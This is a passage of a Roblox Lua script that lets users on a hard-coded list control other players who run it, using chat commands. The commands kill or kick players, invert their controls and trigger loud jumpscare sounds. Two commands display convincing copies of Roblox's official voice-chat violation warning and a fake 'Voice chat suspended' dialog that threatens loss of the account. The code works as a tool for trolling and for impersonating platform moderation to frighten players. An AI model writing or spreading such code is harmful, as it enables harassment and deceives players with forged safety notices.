    if admin.Name == target.Name then
        Chat("You cannot target yourself!")
        return
    end
    
    if command == ".kill" then
        target.Character.Humanoid.Health = 0
    elseif command == ".bring" then
        target.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
    else
        Chat("Command not recognized or not implemented.")
    end
end

-- Admin command handling
local function setupAdminCommands(admin)
    admin.Chatted:Connect(function(msg)
        msg = msg:lower()
        local command, targetPartialName = msg:match("^(%S+)%s+(.*)$")
        if not command or not targetPartialName then
            command = msg -- If no target name is specified, just check the command
        end

        -- Get the target player if a name was specified
        local targetPlayer
        if targetPartialName then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if nameMatches(p, targetPartialName) then
                    targetPlayer = p
                    break
                end
            end
        end

        local player = game.Players.LocalPlayer
        -- Only process commands without targets, or commands where this player is the target
        if not targetPartialName or (targetPlayer and targetPlayer == player) then
            -- Admin Commands
            if command == ".ownercmds" then
                createCommandGui(player)
            elseif command == ".rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
            elseif command == ".fast" then
                player.Character.Humanoid.WalkSpeed = 50
            elseif command == ".normal" then
                player.Character.Humanoid.WalkSpeed = 16
            elseif command == ".slow" then
                player.Character.Humanoid.WalkSpeed = 5
            elseif command == ".unfloat" then
                player.Character.HumanoidRootPart.Anchored = false
            elseif command == ".float" then
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                wait(0.3)
                player.Character.HumanoidRootPart.Anchored = true
            elseif command == ".void" then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
            elseif command == ".jump" then
                player.Character.Humanoid.Jump = true
elseif command == ".trip" then
               local humanoid = player.Character.Humanoid
local hrp = player.Character.HumanoidRootPart
-- Create banana MeshPart
local banana = Instance.new("MeshPart")
banana.MeshId = "rbxassetid://7076530645"
banana.TextureID = "rbxassetid://7076530688"
banana.Size = Vector3.new(0.7, 1, 0.8) -- Made banana bigger
banana.Anchored = true
banana.CanCollide = false
banana.Parent = workspace
-- Create slip sound
local slipSound = Instance.new("Sound")
slipSound.SoundId = "rbxassetid://8317474936"
slipSound.Volume = 1
slipSound.Parent = hrp
-- Use raycast to find floor position
local rayOrigin = hrp.Position + Vector3.new(0, 0, -2)
local rayDirection = Vector3.new(0, -10, 0)
local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
if raycastResult then
    -- Place banana sideways with a 90-degree rotation on X axis
    banana.CFrame = CFrame.new(raycastResult.Position) 
        * CFrame.Angles(math.rad(90), math.rad(math.random(0, 360)), 0)
else
    banana.CFrame = hrp.CFrame * CFrame.new(0, -2.5, -2)
end
   -- Create and configure the forward movement tween
    local tweenService = game:GetService("TweenService")
    local forwardTweenInfo = TweenInfo.new(
        0.3, -- Duration
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )
    
    -- Move character forward
    local forwardGoal = {CFrame = hrp.CFrame * CFrame.new(0, 0, -3)} -- Move 3 studs forward
    local forwardTween = tweenService:Create(hrp, forwardTweenInfo, forwardGoal)
    forwardTween:Play()
 
    -- Wait for forward movement to complete
    task.wait(0.3)
    
    -- Create and configure the arc falling tween
    local fallTweenInfo = TweenInfo.new(
        0.6, -- Longer duration for arc motion
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.In -- Changed to In for better arc effect
    )
    
    -- Tween the character's position and rotation in an arc
    local fallGoal = {
        CFrame = hrp.CFrame 
        * CFrame.new(0, -0.5, -4) -- Move forward and down
        * CFrame.Angles(math.rad(90), 0, 0) -- Rotate forward
    }
    local fallTween = tweenService:Create(hrp, fallTweenInfo, fallGoal)
    fallTween:Play()
humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
task.wait(2)
humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
task.wait(0.5)
humanoid:ChangeState(Enum.HumanoidStateType.None)
task.wait(1)
banana:Destroy()
slipSound:Destroy()
            elseif command == ".sit" then
                player.Character.Humanoid.Sit = true
            elseif command == ".freeze" then
                player.Character.HumanoidRootPart.Anchored = true
                frozenPlayers[player.UserId] = true
            elseif command == ".unfreeze" then
                for userId in pairs(frozenPlayers) do
                    local frozenPlayer = game.Players:GetPlayerByUserId(userId)
                    if frozenPlayer and frozenPlayer.Character then
                        frozenPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                end
                frozenPlayers = {}
            elseif command == ".kick" then
                player:Kick("Kicked")
            elseif command == ".warn" then
-- Gui to Lua
-- Version: 3.2

-- Instances:

local RobloxVoiceChatPromptGui = Instance.new("ScreenGui")
local Content = Instance.new("Frame")
local Toast1 = Instance.new("Frame")
local ToastContainer = Instance.new("TextButton")
local UISizeConstraint = Instance.new("UISizeConstraint")
local Toast = Instance.new("ImageLabel")
local ToastFrame = Instance.new("Frame")
local UIListLayout2 = Instance.new("UIListLayout")
local ToastMessageFrame = Instance.new("Frame")
local UIListLayout3 = Instance.new("UIListLayout")
local ToastTextFrame = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local ToastTitle = Instance.new("TextLabel")
local ToastSubtitle = Instance.new("TextLabel")
local ToastIcon = Instance.new("ImageLabel")
local UIPadding = Instance.new("UIPadding")
local Scaler = Instance.new("UIScale")

--Properties:

RobloxVoiceChatPromptGui.Name = "RobloxVoiceChatPromptGui"
RobloxVoiceChatPromptGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
RobloxVoiceChatPromptGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
RobloxVoiceChatPromptGui.DisplayOrder = 9

Content.Name = "Content"
Content.Parent = RobloxVoiceChatPromptGui
Content.BackgroundTransparency = 1.000
Content.Size = UDim2.new(1, 0, 1, 0)

Toast1.Name = "Toast1"
Toast1.Parent = Content
Toast1.BackgroundTransparency = 1.000
Toast1.Size = UDim2.new(1, 0, 1, 0)

ToastContainer.Name = "ToastContainer"
ToastContainer.Parent = Toast1
ToastContainer.AnchorPoint = Vector2.new(0.5, 0)
ToastContainer.BackgroundTransparency = 1.000
ToastContainer.Position = UDim2.new(0.5, 0, 0, -148)
ToastContainer.Size = UDim2.new(1, -24, 0, 93)
ToastContainer.Text = ""

UISizeConstraint.Parent = ToastContainer
UISizeConstraint.MaxSize = Vector2.new(400, math.huge)
UISizeConstraint.MinSize = Vector2.new(24, 60)

Toast.Name = "Toast"
Toast.Parent = ToastContainer
Toast.AnchorPoint = Vector2.new(0.5, 0.5)
Toast.BackgroundTransparency = 1.000
Toast.BorderSizePixel = 0
Toast.LayoutOrder = 1
Toast.Position = UDim2.new(0.5, 0, 0.5, 0)
Toast.Size = UDim2.new(1, 0, 1, 0)
Toast.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_2.png"
Toast.ImageColor3 = Color3.fromRGB(57, 59, 61)
Toast.ImageRectOffset = Vector2.new(490, 267)
Toast.ImageRectSize = Vector2.new(21, 21)
Toast.ScaleType = Enum.ScaleType.Slice
Toast.SliceCenter = Rect.new(10, 10, 11, 11)

ToastFrame.Name = "ToastFrame"
ToastFrame.Parent = Toast
ToastFrame.BackgroundTransparency = 1.000
ToastFrame.BorderSizePixel = 0
ToastFrame.ClipsDescendants = true
ToastFrame.Size = UDim2.new(1, 0, 1, 0)

UIListLayout2.Name = "UIListLayout2"
UIListLayout2.Parent = ToastFrame
UIListLayout2.FillDirection = Enum.FillDirection.Horizontal
UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout2.Padding = UDim.new(0, 12)

ToastMessageFrame.Name = "ToastMessageFrame"
ToastMessageFrame.Parent = ToastFrame
ToastMessageFrame.BackgroundTransparency = 1.000
ToastMessageFrame.BorderSizePixel = 0
ToastMessageFrame.LayoutOrder = 1
ToastMessageFrame.Size = UDim2.new(1, 0, 1, 0)

UIListLayout3.Name = "UIListLayout3"
UIListLayout3.Parent = ToastMessageFrame
UIListLayout3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout3.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout3.Padding = UDim.new(0, 12)

ToastTextFrame.Name = "ToastTextFrame"
ToastTextFrame.Parent = ToastMessageFrame
ToastTextFrame.BackgroundTransparency = 1.000
ToastTextFrame.LayoutOrder = 2
ToastTextFrame.Size = UDim2.new(1, -48, 0, 69)

UIListLayout.Parent = ToastTextFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

ToastTitle.Name = "ToastTitle"
ToastTitle.Parent = ToastTextFrame
ToastTitle.BackgroundTransparency = 1.000
ToastTitle.LayoutOrder = 1
ToastTitle.Size = UDim2.new(1, 0, 0, 22)
ToastTitle.Font = Enum.Font.BuilderSansBold
ToastTitle.Text = "Remember our policies"
ToastTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastTitle.TextSize = 20.000
ToastTitle.TextWrapped = true
ToastTitle.TextXAlignment = Enum.TextXAlignment.Left

ToastSubtitle.Name = "ToastSubtitle"
ToastSubtitle.Parent = ToastTextFrame
ToastSubtitle.BackgroundTransparency = 1.000
ToastSubtitle.LayoutOrder = 2
ToastSubtitle.Size = UDim2.new(1, 0, 0, 47)
ToastSubtitle.Font = Enum.Font.BuilderSans
ToastSubtitle.Text = "We've detected language that may violate Roblox's Community Standards. You may lose access to Chat with Voice after multiple violations."
ToastSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToastSubtitle.TextSize = 15.000
ToastSubtitle.TextWrapped = true
ToastSubtitle.TextXAlignment = Enum.TextXAlignment.Left

ToastIcon.Name = "ToastIcon"
ToastIcon.Parent = ToastMessageFrame
ToastIcon.BackgroundTransparency = 1.000
ToastIcon.LayoutOrder = 1
ToastIcon.Size = UDim2.new(0, 36, 0, 36)
ToastIcon.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_6.png"
ToastIcon.ImageRectOffset = Vector2.new(248, 386)
ToastIcon.ImageRectSize = Vector2.new(36, 36)

UIPadding.Parent = ToastFrame
UIPadding.PaddingBottom = UDim.new(0, 12)
UIPadding.PaddingLeft = UDim.new(0, 12)
UIPadding.PaddingRight = UDim.new(0, 12)
UIPadding.PaddingTop = UDim.new(0, 12)

Scaler.Name = "Scaler"
Scaler.Parent = Toast


-- Create TweenInfo for smooth animation
local tweenInfo = TweenInfo.new(
    0.2, -- Duration (0.5 seconds)
    Enum.EasingStyle.Quad,
    Enum.EasingDirection.Out
)

-- Get TweenService
local TweenService = game:GetService("TweenService")

-- Define positions
local outPos = UDim2.new(0.5, 0, 0, -35)
local inPos = UDim2.new(0.5, 0, 0, -148)

-- Create tween to out position
local tweenOut = TweenService:Create(ToastContainer, tweenInfo, {
    Position = outPos
})

-- Create tween to in position
local tweenIn = TweenService:Create(ToastContainer, tweenInfo, {
    Position = inPos
})

-- Play the sequence
tweenOut:Play()
wait(6.5) -- Wait for 6.5 seconds
tweenIn:Play()
tweenIn.Completed:Wait() -- Wait for tween to complete
RobloxVoiceChatPromptGui:Destroy() -- Destroy the GUI
elseif command == ".kill" then
                player.Character.Humanoid.Health = 0
elseif command == ".suspend" then
-- Gui to Lua
-- Version: 3.2

-- Instances:

local InGameMenuInformationalDialog = Instance.new("ScreenGui")
local DialogMainFrame = Instance.new("ImageLabel")
local Divider = Instance.new("Frame")
local SpaceContainer2 = Instance.new("Frame")
local TitleTextContainer = Instance.new("Frame")
local TitleText = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local ButtonContainer = Instance.new("Frame")
local Layout = Instance.new("UIListLayout")
local TextSpaceContainer = Instance.new("Frame")
local SubBodyTextContainer = Instance.new("Frame")
local BodyText = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local BodyTextContainer = Instance.new("Frame")
local BodyText_2 = Instance.new("TextLabel")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local WarnText = Instance.new("TextLabel")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local Padding = Instance.new("UIPadding")
local Icon = Instance.new("ImageLabel")
local DividerSpaceContainer = Instance.new("Frame")
local Overlay = Instance.new("TextButton")
local ConfirmButton = Instance.new("ImageButton")
local ButtonContent = Instance.new("Frame")
local ButtonMiddleContent = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Text = Instance.new("TextLabel")
local SecondaryButton = Instance.new("ImageButton")
local sizeConstraint = Instance.new("UISizeConstraint")
local textLabel = Instance.new("TextLabel")
local SecondaryButton_2 = Instance.new("ImageButton")
local sizeConstraint_2 = Instance.new("UISizeConstraint")
local textLabel_2 = Instance.new("TextLabel")

--Properties:

InGameMenuInformationalDialog.Name = "InGameMenuInformationalDialog"
InGameMenuInformationalDialog.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
InGameMenuInformationalDialog.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
InGameMenuInformationalDialog.DisplayOrder = 8

DialogMainFrame.Name = "DialogMainFrame"
DialogMainFrame.Parent = InGameMenuInformationalDialog
DialogMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
DialogMainFrame.BackgroundTransparency = 1.000
DialogMainFrame.Position = UDim2.new(0.5, 0, 0.50000006, 0)
DialogMainFrame.Size = UDim2.new(0, 365, 0, 371)
DialogMainFrame.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_1.png"
DialogMainFrame.ImageColor3 = Color3.fromRGB(57, 59, 61)
DialogMainFrame.ImageRectOffset = Vector2.new(402, 494)
DialogMainFrame.ImageRectSize = Vector2.new(17, 17)
DialogMainFrame.ScaleType = Enum.ScaleType.Slice
DialogMainFrame.SliceCenter = Rect.new(8, 8, 9, 9)

Divider.Name = "Divider"
Divider.Parent = DialogMainFrame
Divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Divider.BackgroundTransparency = 0.800
Divider.BorderSizePixel = 0
Divider.LayoutOrder = 3
Divider.Position = UDim2.new(0.0984615386, 0, 0.268882185, 0)
Divider.Size = UDim2.new(0.800000012, 0, 0, 1)

SpaceContainer2.Name = "SpaceContainer2"
SpaceContainer2.Parent = DialogMainFrame
SpaceContainer2.BackgroundTransparency = 1.000
SpaceContainer2.LayoutOrder = 8
SpaceContainer2.Size = UDim2.new(1, 0, 0, 10)

TitleTextContainer.Name = "TitleTextContainer"
TitleTextContainer.Parent = DialogMainFrame
TitleTextContainer.BackgroundTransparency = 1.000
TitleTextContainer.LayoutOrder = 2
TitleTextContainer.Size = UDim2.new(1, 0, 0, 45)

TitleText.Name = "TitleText"
TitleText.Parent = TitleTextContainer
TitleText.BackgroundTransparency = 1.000
TitleText.Position = UDim2.new(0, 0, 0.514710903, 0)
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.BuilderSansBold
TitleText.LineHeight = 1.400
TitleText.Text = "Voice chat suspended"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextScaled = true
TitleText.TextSize = 25.000
TitleText.TextWrapped = true

UITextSizeConstraint.Parent = TitleText
UITextSizeConstraint.MaxTextSize = 25
UITextSizeConstraint.MinTextSize = 20

ButtonContainer.Name = "ButtonContainer"
ButtonContainer.Parent = DialogMainFrame
ButtonContainer.BackgroundTransparency = 1.000
ButtonContainer.LayoutOrder = 9
ButtonContainer.Size = UDim2.new(1, 0, 0, 36)

Layout.Name = "Layout"
Layout.Parent = ButtonContainer
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout.VerticalAlignment = Enum.VerticalAlignment.Center
Layout.Padding = UDim.new(0, 20)

TextSpaceContainer.Name = "TextSpaceContainer"
TextSpaceContainer.Parent = DialogMainFrame
TextSpaceContainer.BackgroundTransparency = 1.000
TextSpaceContainer.LayoutOrder = 6
TextSpaceContainer.Size = UDim2.new(1, 0, 0, 7)

SubBodyTextContainer.Name = "SubBodyTextContainer"
SubBodyTextContainer.Parent = DialogMainFrame
SubBodyTextContainer.BackgroundTransparency = 1.000
SubBodyTextContainer.LayoutOrder = 7
SubBodyTextContainer.Size = UDim2.new(1, 0, 0, 60)

BodyText.Name = "BodyText"
BodyText.Parent = SubBodyTextContainer
BodyText.BackgroundTransparency = 1.000
BodyText.Position = UDim2.new(0, 0, 2.8499999, 0)
BodyText.Size = UDim2.new(1, 0, 1.20000005, 0)
BodyText.Font = Enum.Font.BuilderSans
BodyText.LineHeight = 1.400
BodyText.Text = "If this happens again, you may lose access to your account."
BodyText.TextColor3 = Color3.fromRGB(189, 190, 190)
BodyText.TextScaled = true
BodyText.TextSize = 20.000
BodyText.TextWrapped = true

UITextSizeConstraint_2.Parent = BodyText
UITextSizeConstraint_2.MaxTextSize = 20
UITextSizeConstraint_2.MinTextSize = 15

BodyTextContainer.Name = "BodyTextContainer"
BodyTextContainer.Parent = DialogMainFrame
BodyTextContainer.BackgroundTransparency = 1.000
BodyTextContainer.LayoutOrder = 5
BodyTextContainer.Size = UDim2.new(1, 0, 0, 120)

BodyText_2.Name = "BodyText"
BodyText_2.Parent = BodyTextContainer
BodyText_2.BackgroundTransparency = 1.000
BodyText_2.Position = UDim2.new(-0.00307692308, 0, 0.683333337, 0)
BodyText_2.Size = UDim2.new(1, 0, 0.842000008, 0)
BodyText_2.Font = Enum.Font.BuilderSans
BodyText_2.LineHeight = 1.400
BodyText_2.Text = "Weâ€™ve temporarily turned off voice chat because you may have used language that goes against Roblox Community Standards."
BodyText_2.TextColor3 = Color3.fromRGB(189, 190, 190)
BodyText_2.TextScaled = true
BodyText_2.TextSize = 20.000
BodyText_2.TextWrapped = true

UITextSizeConstraint_3.Parent = BodyText_2
UITextSizeConstraint_3.MaxTextSize = 20
UITextSizeConstraint_3.MinTextSize = 15

WarnText.Name = "WarnText"
WarnText.Parent = BodyTextContainer
WarnText.BackgroundTransparency = 1.000
WarnText.Position = UDim2.new(0.178461537, 0, 0.341666669, 0)
WarnText.Size = UDim2.new(0.652307689, 0, 0.583333313, 0)
WarnText.Font = Enum.Font.BuilderSansBold
WarnText.LineHeight = 1.400
WarnText.Text = "4 minute suspension"
WarnText.TextColor3 = Color3.fromRGB(189, 190, 190)
WarnText.TextScaled = true
WarnText.TextSize = 97.000
WarnText.TextWrapped = true

UITextSizeConstraint_4.Parent = WarnText
UITextSizeConstraint_4.MaxTextSize = 20
UITextSizeConstraint_4.MinTextSize = 15

Padding.Name = "Padding"
Padding.Parent = DialogMainFrame
Padding.PaddingBottom = UDim.new(0, 20)
Padding.PaddingLeft = UDim.new(0, 20)
Padding.PaddingRight = UDim.new(0, 20)
Padding.PaddingTop = UDim.new(0, 20)

Icon.Name = "Icon"
Icon.Parent = DialogMainFrame
Icon.AnchorPoint = Vector2.new(0.5, 0.5)
Icon.BackgroundTransparency = 1.000
Icon.BorderSizePixel = 0
Icon.LayoutOrder = 1
Icon.Position = UDim2.new(0.503076911, 0, 0.0212310497, 0)
Icon.Size = UDim2.new(0, 55, 0, 55)
Icon.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_6.png"
Icon.ImageRectOffset = Vector2.new(248, 386)
Icon.ImageRectSize = Vector2.new(36, 36)

DividerSpaceContainer.Name = "DividerSpaceContainer"
DividerSpaceContainer.Parent = DialogMainFrame
DividerSpaceContainer.BackgroundTransparency = 1.000
DividerSpaceContainer.LayoutOrder = 4
DividerSpaceContainer.Size = UDim2.new(1, 0, 0, 7)

Overlay.Name = "Overlay"
Overlay.Parent = InGameMenuInformationalDialog
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0.500
Overlay.BorderSizePixel = 0
Overlay.Position = UDim2.new(0, 0, 0, -60)
Overlay.Size = UDim2.new(2, 0, 2, 0)
Overlay.ZIndex = 0
Overlay.AutoButtonColor = false
Overlay.Text = ""

ConfirmButton.Name = "ConfirmButton"
ConfirmButton.Parent = InGameMenuInformationalDialog
ConfirmButton.BackgroundTransparency = 1.000
ConfirmButton.LayoutOrder = 1
ConfirmButton.Position = UDim2.new(0.395999999, 0, 0.610000005, 0)
ConfirmButton.Size = UDim2.new(0.218181819, -5, 0, 48)
ConfirmButton.AutoButtonColor = false
ConfirmButton.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_1.png"
ConfirmButton.ImageRectOffset = Vector2.new(402, 494)
ConfirmButton.ImageRectSize = Vector2.new(17, 17)
ConfirmButton.ScaleType = Enum.ScaleType.Slice
ConfirmButton.SliceCenter = Rect.new(8, 8, 9, 9)

ButtonContent.Name = "ButtonContent"
ButtonContent.Parent = ConfirmButton
ButtonContent.BackgroundTransparency = 1.000
ButtonContent.Size = UDim2.new(1, 0, 1, 0)

ButtonMiddleContent.Name = "ButtonMiddleContent"
ButtonMiddleContent.Parent = ButtonContent
ButtonMiddleContent.BackgroundTransparency = 1.000
ButtonMiddleContent.Size = UDim2.new(1, 0, 1, 0)

UIListLayout.Parent = ButtonMiddleContent
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout.Padding = UDim.new(0, 5)

Text.Name = "Text"
Text.Parent = ButtonMiddleContent
Text.BackgroundTransparency = 1.000
Text.LayoutOrder = 2
Text.Position = UDim2.new(0.184049085, 0, -0.270833343, 0)
Text.Size = UDim2.new(0, 103, 0, 22)
Text.Font = Enum.Font.BuilderSansBold
Text.Text = "I Understand"
Text.TextColor3 = Color3.fromRGB(57, 59, 61)
Text.TextSize = 20.000
Text.TextWrapped = true

SecondaryButton.Name = "SecondaryButton"
SecondaryButton.Parent = InGameMenuInformationalDialog
SecondaryButton.BackgroundTransparency = 1.000
SecondaryButton.LayoutOrder = 1
SecondaryButton.Position = UDim2.new(0.0356753246, 0, 0.329711277, 0)
SecondaryButton.Size = UDim2.new(1, -5, 0, 36)
SecondaryButton.AutoButtonColor = false

sizeConstraint.Name = "sizeConstraint"
sizeConstraint.Parent = SecondaryButton
sizeConstraint.MinSize = Vector2.new(295, 42.1599998)

textLabel.Name = "textLabel"
textLabel.Parent = SecondaryButton
textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel.BackgroundTransparency = 1.000
textLabel.Position = UDim2.new(0.473154902, 0, 6.42753744, 0)
textLabel.Size = UDim2.new(0, 381, 0, 44)
textLabel.Font = Enum.Font.BuilderSansBold
textLabel.Text = "Let us know"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20.000
textLabel.TextTransparency = 0.300
textLabel.TextWrapped = true

SecondaryButton_2.Name = "SecondaryButton"
SecondaryButton_2.Parent = InGameMenuInformationalDialog
SecondaryButton_2.BackgroundTransparency = 1.000
SecondaryButton_2.LayoutOrder = 1
SecondaryButton_2.Position = UDim2.new(0.0356753246, 0, 0.329711277, 0)
SecondaryButton_2.Size = UDim2.new(1, -5, 0, 36)
SecondaryButton_2.AutoButtonColor = false

sizeConstraint_2.Name = "sizeConstraint"
sizeConstraint_2.Parent = SecondaryButton_2
sizeConstraint_2.MinSize = Vector2.new(295, 42.1599998)

textLabel_2.Name = "textLabel"
textLabel_2.Parent = SecondaryButton_2
textLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel_2.BackgroundTransparency = 1.000
textLabel_2.Position = UDim2.new(0.471051186, 0, 5.97912741, 0)
textLabel_2.Size = UDim2.new(0, 381, 0, 22)
textLabel_2.Font = Enum.Font.BuilderSansBold
textLabel_2.Text = "Did we make a mistake? "
textLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel_2.TextSize = 20.000
textLabel_2.TextTransparency = 0.300
textLabel_2.TextWrapped = true

-- Scripts:

local function KIAWSKW_fake_script() -- ConfirmButton.LocalScript 
	local script = Instance.new('LocalScript', ConfirmButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(KIAWSKW_fake_script)()

            elseif command == ".bring" then
                player.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
            elseif command == ".js" then
                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=10798732430"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://161964303", 10
                sound:Play()
                wait(1.674)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".js2" then
                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=75431648694596"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://7236490488", 100
                sound:Play()
                wait(3.599)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".invert" then
                if not controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local inversionConnection = humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
                            humanoid:Move(Vector3.new(-humanoid.MoveDirection.X, 0, -humanoid.MoveDirection.Z), true)
                        end)
                        wait(10) -- Invert for 10 seconds
                        inversionConnection:Disconnect()
                        controlInversionActive[player.UserId] = nil
                    end
                end
            elseif command == ".uninvert" then
                if controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = nil
                end
            elseif command == ".spin" then
                if not spinActive[player.UserId] then
                    spinActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local initialRotation = char.HumanoidRootPart.CFrame
                        for i = 1, 12 do
                            wait(0.1)
                            char.HumanoidRootPart.CFrame = initialRotation * CFrame.Angles(0, math.rad(30 * i), 0)
                        end
                    end
                end
            elseif command == ".unspin" then
                if spinActive[player.UserId] then
                    spinActive[player.UserId] = nil
                end
            elseif command == ".disablejump" then
                if not jumpDisabled[player.UserId] then
                    jumpDisabled[player.UserId] = true
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 0
                        wait(5)
                        humanoid.JumpPower = 50 -- Reset jump power (default can vary)
                        jumpDisabled[player.UserId] = nil
                    end
                end
            elseif command == ".unenablejump" then
                if jumpDisabled[player.UserId] then
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 50 -- Reset jump power
                    end
                    jumpDisabled[player.UserId] = nil
                end
            elseif command == ".scare" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://157636218"
                sound.Volume = 100
                sound:Play()
                wait(2.5) -- Wait for the sound to finish
                sound:Destroy()
                elseif command == ".knock" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://5236308259"
                sound.Volume = 100
                sound:Play()
                wait(15) -- Wait for the sound to finish
                sound:Destroy()
            elseif command == ".bighead" then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    head.Size = head.Size * 2
                end
            elseif command == ".tiny" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(0.5, 0.5, 0.5)
                end
            elseif command == ".big" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(2, 2, 2)
                end
            elseif command == ".sillyhat" then
                local hat = Instance.new("Accessory")
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshId = "rbxassetid://14170755549" -- Change this to a funny hat asset ID
                mesh.Parent = hat
                hat.Parent = player.Character
            end
        end
    end)
end

-- Add admin functionality for listed users
for _, player in ipairs(game.Players:GetPlayers()) do
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end)
